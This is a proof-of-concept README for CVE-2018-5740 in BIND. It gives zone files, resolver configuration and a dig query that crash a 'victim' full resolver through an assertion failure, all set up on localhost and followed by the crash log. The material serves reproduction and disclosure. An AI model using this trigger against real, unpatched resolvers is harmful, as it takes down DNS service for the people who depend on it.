# CVE-2018-5740 PoC

Named, which is received response from legimate authoritative server, is crashed by CVE-2018-5740.

## FILES

* named.conf: BIND configration file for authoritative server.
* example.com: zone file for authoritative server.
* named-full-resolver.conf: BIND configration file for victim full-resolver server.

## REPRODUCE STEPS

Install CentOS 7.5.

Install bind and bind-utils packages.

```
# yum install bind-9.9.4-61.el7.x86_64 bind-utils-9.9.4-61.el7.x86_64

```

### Setup Authoritateive Server.

Create Zone file for example.com zone.

```
# vi /var/named/example.com
# chown root:named /var/named/example.com
```

example.com zone file.

```
$TTL 1D
@	IN SOA	@ rname.invalid. (
					0	; serial
					1D	; refresh
					1H	; retry
					1W	; expire
					3H )	; minimum
	NS	@
	A	127.0.0.1
	AAAA	::1

dname	IN DNAME	child.example.com.
```

Edit named.conf to add example.com zone.

```
# vi /etc/named.conf
```

example.com zone directive.

```
zone "example.com" IN {
	type master;
	file "example.com";
};
```

Start authoritateive server service.

```
# systemctl start named
```

### Setup Victim Full-Resolver Server

Create configration file for full-resolver server.

```
# vi /etc/named-full-resulver.conf
```

named-full-resolver.conf

```
options {
	listen-on port 10053 { 127.0.0.1; };
	listen-on-v6 port 10053 { ::1; };
	directory 	"/var/named";
	dump-file 	"/var/named/data/cache_dump.db";
	statistics-file "/var/named/data/named_stats.txt";
	memstatistics-file "/var/named/data/named_mem_stats.txt";
	allow-query     { localhost; };

	recursion yes;

	dnssec-enable yes;
	dnssec-validation yes;

	/* Path to ISC DLV key */
	bindkeys-file "/etc/named.iscdlv.key";

	managed-keys-directory "/var/named/dynamic";

	pid-file	"/var/run/named/named-full-resolver.pid";
	session-keyfile "/run/named/session.key";

	deny-answer-aliases {
		"dname.example.com";
	};
};

logging {
        channel default_debug {
                file "data/named.run";
                severity dynamic;
        };
};

zone "." IN {
	type hint;
	file "named.ca";
};

zone "example.com" IN {
	type static-stub;
	server-addresses { 127.0.0.1; };
};

include "/etc/named.rfc1912.zones";
include "/etc/named.root.key";
```

Start authoritateive server service.

```
# /usr/sbin/named -u named -c /etc/named-full-resolver.conf
```

Send query to full-resolver.

```
$ dig @127.0.0.1 -p 10053 dname.example.com DNAME +rec
```

See /var/log/messages.

```
Aug 15 10:45:30 bind named[11523]: name.c:2117: REQUIRE(suffixlabels > 0) failed, back trace
Aug 15 10:45:30 bind named[11523]: #0 0x55651c255b60 in ??
Aug 15 10:45:30 bind named[11523]: #1 0x7fa8a4e1717a in ??
Aug 15 10:45:30 bind named[11523]: #2 0x7fa8a64f87e9 in ??
Aug 15 10:45:30 bind named[11523]: #3 0x7fa8a64a3daf in ??
Aug 15 10:45:30 bind named[11523]: #4 0x7fa8a64a4ff0 in ??
Aug 15 10:45:30 bind named[11523]: #5 0x7fa8a657d33e in ??
Aug 15 10:45:30 bind named[11523]: #6 0x7fa8a4e3a066 in ??
Aug 15 10:45:30 bind named[11523]: #7 0x7fa8a49eae25 in ??
Aug 15 10:45:30 bind named[11523]: #8 0x7fa8a3a5ebad in ??
Aug 15 10:45:30 bind named[11523]: exiting (due to assertion failure)
```

